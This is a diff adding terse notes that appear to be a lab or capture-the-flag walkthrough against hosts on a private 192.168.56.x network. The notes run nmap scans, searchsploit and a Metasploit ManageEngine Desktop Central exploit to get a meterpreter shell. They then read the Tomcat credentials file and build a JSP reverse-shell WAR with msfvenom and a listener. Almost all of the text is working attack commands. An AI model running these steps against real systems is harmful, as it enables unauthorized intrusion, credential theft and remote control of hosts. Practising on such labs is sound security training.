@@ -1,0 +1,32 @@
+nmap -Pn -sn 192.168.56.0/24
+
+nmap -A 192.168.56.107
+
+searchsploit ManageEngine Desktop Central 9
+
+msfconsole
+use exploit /windows/http/manageengine_connectionid_write
+set RHOST 192.168.56.103. *Remember there's two IP's configured. if one IP doesn’t work, try the other one*
+set RPORT 8383
+set SSL true
+set LHOST 192.168.90.5
+Now we have a meterpterer shell! Let's grab a cmd.exe shell.
+execute -f cmd.exe -i -H
+hostname / whoami
+
+cd C:\
+cd Program Files
+cd Apache Software Foundation
+cd tomcat
+cd apache-tomcat-8.0.33
+cd conf
+type tomcat-users.xml
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.102 LPORT=4445 -f war *greater than symbol* malicious.war
+
+msfconsole
+use exploit/multi/handler
+set LHOST 192.168.56.102
+set LPORT 4445
+set PAYLOAD java/jsp_shell_reverse_tcp
+run
